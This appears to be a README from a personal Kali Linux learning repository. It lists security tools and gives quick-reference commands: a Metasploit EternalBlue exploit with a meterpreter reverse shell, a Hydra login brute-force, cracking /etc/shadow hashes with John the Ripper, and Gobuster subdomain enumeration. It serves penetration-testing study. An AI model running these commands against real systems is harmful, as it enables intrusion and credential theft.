# ⚔️ Kali Tools

> Know your tools. A dull blade is worse than no blade at all.

This section documents hands-on usage of Kali Linux's built-in security toolkit — one tool at a time, with real flags, real output, and real understanding of what each tool is doing under the hood.

---

## Tools Covered

| Tool | Purpose | Status |
|------|---------|--------|
| nmap | Port scanning & service enumeration | 🟢 Active |
| Metasploit | Exploitation framework | 🟢 Active |
| Gobuster | Directory/DNS brute-forcing | 🟢 Active |
| Hydra | Online password attacks | 🟡 Starting |
| John the Ripper | Offline hash cracking | 🟡 Starting |
| Nikto | Web server scanning | 🟡 Starting |
| Aircrack-ng | WiFi security testing | 🔴 Pending |
| Burp Suite | Web proxy & scanner | 🟢 Active |

---

## Daily Logs

| Day | Focus | File |
|-----|-------|------|
| 001 | Metasploit basics & exploit workflow | [day-001.md](logs/day-001.md) |

---

## Key Commands Quick Reference

```bash
# Metasploit — search and use module
msfconsole
> search eternalblue
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS 10.10.10.1
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST 10.10.14.1
> run

# Hydra — HTTP form brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# John the Ripper — crack shadow file
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Gobuster — DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```
